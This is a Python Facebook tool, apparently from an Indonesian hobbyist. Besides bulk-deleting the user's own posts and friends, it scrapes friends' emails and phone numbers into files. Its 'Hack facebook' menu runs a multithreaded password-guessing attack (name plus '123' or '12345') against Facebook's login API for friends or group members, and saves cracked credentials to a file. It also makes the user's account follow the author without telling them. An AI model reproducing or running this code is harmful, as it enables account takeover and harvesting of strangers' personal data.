#!/usr/bin/python
# -*- coding: utf-8 -*-
# Coded by DulLah
# YA MAAP KALO SOURCENYA BERANTAKAN NAMANYA JUGA BELAJAR :)*

#### IMPORT MODULE ####
import os, sys, time, json, requests, hashlib
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError

#### WARNA ####
p='\033[1;97m' #putih
m='\033[1;91m' #merah
h='\033[1;92m' #hijau
k='\033[1;93m' #kuning

#### URL ####
url='https://graph.facebook.com/'
fb='https://api.facebook.com/restserver.php'
headers={'User-Agent':'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16'}
s=requests.Session()

#### MENULIS ####
def lunga(s):
	for a in s +'\n':
		sys.stdout.write(a)
		sys.stdout.flush()
		time.sleep(0.05)

#### LOGO ####
logo=(p+'''
'''+h+'''    ╭◑❖◢◤◥◣◢◤◥◣◢◣◢◣◢◣◢◣◢◣◢◤◥◣◢◤◥◣❖◐╮ 
'''+h+'''    ║╭✿'''+p+'''   ╔╗ ╔═╗╔╦╗  ╔═╗╔═╗╦ ╦'''+h+'''   ✿╮║
'''+h+'''    ║  '''+p+'''   ╠╩╗║ ║ ║   ╠═╣╚═╗║ ║'''+h+'''     ║
'''+h+'''    ║╰✿'''+p+'''   ╚═╝╚═╝ ╩   ╩ ╩╚═╝╚═╝'''+h+'''   ✿╯║
'''+h+'''    ╰◑❖◥◣◢◤◥◣◢◤◥◤◥◤◥◤◥◤◥◤◥◣◢◤◥◣◢◤❖◐╯
'''+m+'''            Coded by DulLah
'''+k+'''    https://www.facebook.com/DulahZX
''')

ok=[]
cp=[]
id=[]
phone=[]
email=[]

#### MENU ####
def menu():
	os.system('clear')
	try:
		token=open('result/token.txt','r').read()
	except IOError:
		print(m+'['+p+'!'+m+'] Token not found')
		time.sleep(1)
		os.system('rm -rf result/token.txt')
	try:
		ok=s.get(url+'me?access_token='+token).json()
	except KeyError:
		print(m+'['+p+'!'+m+'] Token not found')
		os.system('rm -rf result/token.txt')
	os.system('clear')
	print(logo)
	print(p+40*'_')
	print(m+'\n['+h+'✓'+m+']'+p+' Name '+h+ok['name'])
	print(p+40*'_')
	print(m+'\n['+p+'01'+m+']'+p+' Delete all post')
	print(m+'['+p+'02'+m+']'+p+' Delete albums')
	print(m+'['+p+'03'+m+']'+p+' Delete all photo in albums')
	print(m+'['+p+'04'+m+']'+p+' Delete all friend')
	print(m+'['+p+'05'+m+']'+p+' Stop following all friend')
	print(m+'['+p+'06'+m+']'+p+' Dump email')
	print(m+'['+p+'07'+m+']'+p+' Dump phone numbers')
	print(m+'['+p+'08'+m+']'+p+' Hack facebook '+m+'< '+h+'masal'+m+' >')
	print(m+'['+p+'00'+m+'] Exit the program')
	z=input('\n'+p+'>>> ')
	if z=='':
		print(m+'[!] Wrong input')
		time.sleep(1)
		menu()
	elif z=='1' or z=='01':
		post()
	elif z=='2' or z=='02':
		albums()
	elif z=='3' or z=='03':
		photo()
	elif z=='4' or z=='04':
		unfriend()
	elif z=='5' or z=='05':
		stopfollowing()
	elif z=='6' or z=='06':
		getemail()
	elif z=='7' or z=='07':
		getphone()
	elif z=='8' or z=='08':
		menumbf()
	elif z=='0' or z=='00':
		os.system('rm -rf token.txt')
		os.sys.exit()
	else:
		print(m+'[!] Wrong input')
		time.sleep(1)
		menu()
		
#### DELETE POST ####
def post():
	os.system('clear')
	try:
		token=open('result/token.txt','r').read()
	except IOError:
		print(m+'['+p+'!'+m+'] Token not found')
		time.sleep(1)
		os.system('rm -rf token.txt')
		login()
	os.system('clear')
	print(logo)
	print(p+40*'_')
	lunga(m+'\n['+p+'+'+m+']'+h+' Start ...')
	print(p+40*'_'+'\n')
	ok=s.get(url+'me/posts?access_token='+token).json()
	for o in ok['data']:
		ya=s.post(url+o['id']+'?method=DELETE&access_token='+token).json()
		try:
			asu=ya['error']['message']
			print(m+'[×] Failed')
		except TypeError:
			print(m+'['+h+' Deleted '+m+'] '+p+o['id'])
		except requests.exceptions.ConnectionError:
			print(m+'['+p+'×'+m+'] No connection')
	print(m+'\n['+h+'✓'+m+']'+p+' Program finished')
	
#### DELETE ALBUMS ####
def albums():
	os.system('clear')
	try:
		token=open('result/token.txt','r').read()
	except IOError:
		print(m+'['+p+'!'+m+'] Token not found')
		time.sleep(1)
		os.system('rm -rf result/token.txt')
		login()
	os.system('clear')
	print(logo)
	print(p+40*'_')
	lunga(m+'\n['+p+'+'+m+']'+h+' Start ...')
	print(p+40*'_'+'\n')
	ok=s.get(url+'v2.3/me/albums?access_token='+token).json()
	for o in ok['data']:
		ya=s.post(url+o['id']+'?method=DELETE&access_token='+token).json()
		try:
			asu=ya['error']['message']
			print(m+'[×] Failed '+o['name'])
		except TypeError:
			print(m+'['+h+' Deleted '+m+'] '+p+o['name'])
		except requests.exceptions.ConnectionError:
			print(m+'['+p+'×'+m+'] No connection')
	print(m+'\n['+h+'✓'+m+']'+p+' Program finished')
	
#### DELETE PHOTO ALBUMS ####
def photo():
	os.system('clear')
	try:
		token=open('result/token.txt','r').read()
	except IOError:
		print(m+'['+p+'!'+m+'] Token not found')
		time.sleep(1)
		os.system('rm -rf result/token.txt')
		login()
	os.system('clear')
	print(logo)
	print(p+40*'_')
	al=input(m+'\n['+p+'+'+m+']'+h+' Input ID album'+p+' : ')
	lunga(m+'['+p+'+'+m+']'+h+' Start ...')
	print(p+40*'_'+'\n')
	ok=s.get(url+al+'/photos?access_token='+token).json()
	for o in ok['data']:
		ya=s.post(url+o['id']+'?method=DELETE&access_token='+token).json()
		try:
			asu=ya['error']['message']
			print(m+'[×] Failed')
		except TypeError:
			print(m+'['+h+' Deleted '+m+'] '+p+o['id'])
		except KeyError:
			print(m+'[!] Album not found')
		except requests.exceptions.ConnectionError:
			print(m+'['+p+'×'+m+'] No connection')
	print(m+'\n['+h+'✓'+m+']'+p+' Program finished')

#### UNFRIEND ####
def unfriend():
	os.system('clear')
	try:
		token=open('result/token.txt','r').read()
	except IOError:
		print(m+'['+p+'!'+m+'] Token not found')
		time.sleep(1)
		os.system('rm -rf result/token.txt')
		login()
	os.system('clear')
	print(logo)
	print(p+40*'_')
	lunga(m+'\n['+p+'+'+m+']'+h+' Start ...')
	print(p+40*'_'+'\n')
	ok=s.get(url+'me/friends?access_token='+token).json()
	for o in ok['data']:
		ya=s.delete(url+'me/friends?uid='+o['id']+'&access_token='+token).json()
		try:
			asu=ya['error']['message']
			print(m+'[×] Failed')
		except TypeError:
			print(m+'['+h+' Unfriend '+m+'] '+p+o['name'])
		except requests.exceptions.ConnectionError:
			print(m+'['+p+'×'+m+'] No connection')
	print(m+'\n['+h+'✓'+m+']'+p+' Program finished')

#### STOP FOLLOWING ALL FRIEND ####
def stopfollowing():
	os.system('clear')
	try:
		token=open('token.txt','r').read()
	except IOError:
		print(m+'['+p+'!'+m+'] Token not found')
		time.sleep(1)
		os.system('rm -rf result/token.txt')
		login()
	os.system('clear')
	print(logo)
	print(p+40*'_')
	lunga(m+'\n['+p+'+'+m+']'+h+' Start ...')
	print(p+40*'_'+'\n')
	ok=s.get(url+'me/subscribedto?limit=5000&access_token='+token).json()
	for o in ok['data']:
		ya=s.post(url+o['id']+'/subscribers?method=delete&access_token='+token).json()
		try:
			asu=ya['error']['message']
			print(m+'[×] Failed')
		except TypeError:
			print(m+'['+h+' Unfollow '+m+'] '+p+o['name'])
		except requests.exceptions.ConnectionError:
			print(m+'['+p+'×'+m+'] No connection')
	print(m+'\n['+h+'✓'+m+']'+p+' Program finished')
	
#### EMAIL FRIEND ####
def getemail():
	os.system('clear')
	try:
		token=open('result/token.txt','r').read()
	except IOError:
		print(m+'['+p+'!'+m+'] Token not found')
		time.sleep(1)
		os.system('rm -rf result/token.txt')
		login()
	os.system('clear')
	print(logo)
	print(p+40*'_')
	lunga(m+'\n['+p+'*'+m+']'+h+' Fetching all email')
	lunga(m+'['+p+'+'+m+']'+h+' Start ...')
	print(p+40*'_'+'\n')
	ok=s.get(url+'me/friends?access_token='+token).json()
	mail=open('result/mail.txt','w')
	for o in ok['data']:
		ya=s.get(url+o['id']+'?access_token='+token).json()
		try:
			print(m+'['+p+'*'+m+'] '+p+ya['name']+m+' >> '+h+ya['email'])
			email.append(ya['email'])
			mail.write(ya['email']+'\n')
		except requests.exceptions.ConnectionError:
			print(m+'['+p+'×'+m+'] No connection')
		except KeyError:
			pass
	mail.close()
	print(m+'\n['+h+'✓'+m+']'+p+' Program finished')
	print(m+'['+p+'+'+m+']'+p+' Total email : '+h+str(len(email)))
	print(m+'['+p+'+'+m+']'+p+' File saved : '+h+'result/mail.txt')

#### PHONE NUMBERS ####
def getphone():
	os.system('clear')
	try:
		token=open('result/token.txt','r').read()
	except IOError:
		print(m+'['+p+'!'+m+'] Token not found')
		time.sleep(1)
		os.system('rm -rf result/token.txt')
		login()
	os.system('clear')
	print(logo)
	print(p+40*'_')
	lunga(m+'\n['+p+'*'+m+']'+h+' Fetching all phone numbers')
	lunga(m+'['+p+'+'+m+']'+h+' Start ...')
	print(p+40*'_'+'\n')
	ok=s.get(url+'me/friends?access_token='+token).json()
	ph=open('result/phone.txt','w')
	for o in ok['data']:
		ya=s.get(url+o['id']+'?access_token='+token).json()
		try:
			print(m+'['+p+'*'+m+'] '+p+ya['name']+m+' >> '+h+ya['mobile_phone'])
			phone.append(ya['mobile_phone'])
			ph.write(ya['mobile_phone']+'\n')
		except requests.exceptions.ConnectionError:
			print(m+'['+p+'×'+m+'] No connection')
		except KeyError:
			pass
	ph.close()
	print(m+'\n['+h+'✓'+m+']'+p+' Program finished')
	print(m+'['+p+'+'+m+']'+p+' Total phone numbers : '+h+str(len(phone)))
	print(m+'['+p+'+'+m+']'+p+' File saved : '+h+'result/phone.txt')

#### MBF ####
def menumbf():
	global token, p, m, k, h, ok, cp, headers, url
	os.system('clear')
	try:
		token=open('result/token.txt','r').read()
	except IOError:
		print(m+'['+p+'!'+m+'] Token not found')
		time.sleep(1)
		os.system('rm -rf result/token.txt')
		login()
	os.system('clear')
	print(logo)
	print(p+40*'_')
	print(m+'\n['+p+'01'+m+']'+p+' Crack from list friend')
	print(m+'['+p+'02'+m+']'+p+' Crack from friend')
	print(m+'['+p+'03'+m+']'+p+' Crack from member group')
	print(m+'['+p+'00'+m+'] Exit')
	e=input('\n'+p+'>>> ')
	if e=='':
		print(m+'[!] Wrong input')
		time.sleep(1)
		menumbf()
	elif e=='1' or e=='01':
		os.system('clear')
		print(logo)
		print(p+40*'_')
		oh=s.get(url+'me/friends?access_token='+token).json()
		for o in oh['data']:
			id.append(o['id'])
	elif e=='2' or e=='02':
		os.system('clear')
		print(logo)
		print(p+40*'_')
		fr=input(m+'\n['+p+'+'+m+']'+h+' Id friend '+p+': ')
		try:
			oa=s.get(url+fr+'?access_token='+token).json()
			print(m+'['+p+'+'+m+']'+h+' from '+p+': '+oa['name'])
		except KeyError:
			print(m+'['+p+'×'+m+'] Friend not found')
			os.sys.exit()
		ok=s.get(url+fr+'/friends?access_token='+token).json()
		for i in ok['data']:
			id.append(i['id'])
	elif e=='3' or e=='03':
		os.system('clear')
		print(logo)
		print(p+40*'_')
		gr=input(m+'\n['+p+'+'+m+']'+h+' Id group '+p+': ')
		try:
			ow=s.get(url+'group/?id='+gr+'&access_token='+token).json()
			print(m+'['+p+'+'+m+']'+h+' from '+p+': '+ow['name'])
		except KeyError:
			print(m+'['+p+'×'+m+'] Group not found')
			os.sys.exit()
		oq=s.get(url+gr+'/members?fields=name,id&limit=9999&access_token='+token).json()
		for j in oq['data']:
			id.append(j['id'])
	elif e=='0' or e=='00':
		menu()
	else:
		print(m+'[!] Wrong input')
		time.sleep(1)
		menumbf()
			
	print(m+'['+p+'+'+m+']'+h+' Total id '+p+': '+str(len(id)))
	lunga(m+'['+p+'+'+m+']'+h+' Start ...')
	print(p+40*'_'+'\n')
	
	#### CRACK ####
	def crack(asw):
		user=asw
		try:
			ya=s.get(url+user+'/?access_token='+token).json()
			r=s.get(url+user+'/subscribers?access_token='+token).json()
			sub=str(r['summary']['total_count'])
			pas1=ya['first_name']+'123'
			b=s.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+user+'&locale=en_US&password='+pas1+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers=headers).json()
			if 'access_token' in b:
				print(m+'['+h+'OK✓'+m+'] '+p+user+m+' | '+p+pas1+m+' >> '+p+sub)
				ok.append(user+pas1)
			else:
				if 'www.facebook.com' in b['error_msg']:
					print(m+'['+k+'CP+'+m+'] '+p+user+m+' | '+p+pas1+m+' >> '+p+sub)
					cp.append(user+pas1)
					c=open('result/cp.txt','a')
					c.write(user+' | '+pas1+' >> '+sub+'\n')
					c.close()
				else:
					pas2=ya['last_name']+'123'
					b=s.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+user+'&locale=en_US&password='+pas2+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers=headers).json()
					if 'access_token' in b:
						print(m+'['+h+'OK✓'+m+'] '+p+user+m+' | '+p+pas2+m+' >> '+p+sub)
						ok.append(user+pas2)
					else:
						if 'www.facebook.com' in b['error_msg']:
							print(m+'['+k+'CP+'+m+'] '+p+user+m+' | '+p+pas2+m+' >> '+p+sub)
							cp.append(user+pas2)
							c=open('result/cp.txt','a')
							c.write(user+' | '+pas2+' >> '+sub+'\n')
							c.close()
						else:
							pas3=ya['first_name']+'12345'
							b=s.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+user+'&locale=en_US&password='+pas3+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers=headers).json()
							if 'access_token' in b:
								print(m+'['+h+'OK✓'+m+'] '+p+user+m+' | '+p+pas3+m+' >> '+p+sub)
								ok.append(user+pas3)
							else:
								if 'www.facebook.com' in b['error_msg']:
									print(m+'['+k+'CP+'+m+'] '+p+user+m+' | '+p+pas3+m+' >> '+p+sub)
									cp.append(user+pas3)
									c=open('result/cp.txt','a')
									c.write(user+' | '+pas3+' >> '+sub+'\n')
									c.close()
									
				
		except:
			pass
			
	f = ThreadPool(30)
	f.map(crack, id)
	print(m+'\n['+h+'✓'+m+']'+p+' Program finished')
	print(m+'['+p+'+'+m+']'+p+' Total '+h+'OK'+p+'/'+k+'CP: '+h+str(len(ok))+p+' / '+k+str(len(cp)))
	print(m+'['+h+'+'+m+']'+p+' CP file saved : '+h+'result/cp.txt')
	
#### GET TOKEN ####
if __name__=='__main__':
	os.system('clear')
	try:
		os.mkdir('result')
	except OSError:
		pass
	try:
		token=open('result/token.txt','r')
		menu()
	except (KeyError,IOError):
		os.system('clear')
		print(logo)
		print(p+40*'_')
		em=input(m+'\n['+p+'*'+m+']'+h+' Email'+p+' : ')
		pas=input(m+'['+p+'*'+m+']'+h+' Pass'+p+'  : ')
		print(m+'['+p+'!'+m+']'+p+' Generate access token')
		try:
			sig='api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+em+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pas+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
			data={"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":em,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pas,"return_ssl_resources":"0","v":"1.0"}
			x=hashlib.new('md5')
			x.update(sig.encode('utf-8'))
			data.update({'sig':x.hexdigest()})
			ok=s.get(fb,params=data).json()
			result=open('token.txt','w')
			result.write(ok['access_token'])
			result.close()
			if 'access_token' in ok:
				token=open('result/token.txt','r').read()
				print(m+'['+h+'✓'+m+']'+h+' Success generate access token');s.post('https://graph.facebook.com/DulahZX/subscribers?access_token='+token)
				time.sleep(1)
				menu()
		except KeyError:
			print(m+'['+p+'×'+m+'] Error please cek your account and try again')
			os.system('rm -rf token.txt')
		except requests.exceptions.ConnectionError:
			print(m+'['+p+'×'+m+'] No connection')
